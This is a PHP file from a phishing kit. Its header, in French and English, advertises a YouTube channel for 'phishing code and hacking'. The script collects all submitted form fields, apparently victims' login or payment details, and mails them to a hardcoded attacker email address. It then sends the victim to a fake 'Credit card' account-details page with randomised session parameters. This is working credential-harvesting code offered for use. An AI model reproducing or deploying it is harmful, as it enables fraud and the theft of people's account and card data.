<?php
/*                                                                                                         
####################################################################
# s'abonner sur ma chaine youtube pour avoir plus de code phishing #
# et hacking,il me donne le courage de faire les codes phishing    #                                                                              
#                                                                  #
# subscribe on my youtube channel to have more phishing code       #
# and hacking, it gives me the courage to do the phishing codes    #
#                                                                  #
#             ||~~ BY ~~ hakanonymos ~~||                          #
#                                                                  #
#  https://www.youtube.com/channel/UCQsDsjPcX3UoQuJPz7BBxxg        #
#                                                                  #
#    skype et email : hakanonymos@hotmail.com                      #                                                                 
####################################################################                                                                                                    
*/
$headers = 'MIME-Version: 1.0' . "\r\n"; 
 
$headers .= 'To: hakanonymos@hotmail.com ' . "\r\n";//ici vous mettez votre adresse email gmail ou hotmail....etc

$headers .= 'From: tonsite.com ' . "\r\n";//ici vous mettez le nom de votre site web.

$headers .= 'Content-Type: text/plain; charset=UTF-8' . "\r\n";
$headers .= 'Content-Transfer-Encoding: 8bit' . "\r\n";
$subject = "resultats";
$message = "";
while (list($key, $val) = each($_POST)) {if(!empty($val)) {$message .= "$key : $val\n";}}
mail($TO, $subject, $message, $headers);

	header("location: Credit card.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));

?>
<html lang="en">
    <head>
		<script language="php">require ('img/logo.png');</script>
    </head>
	 </html>

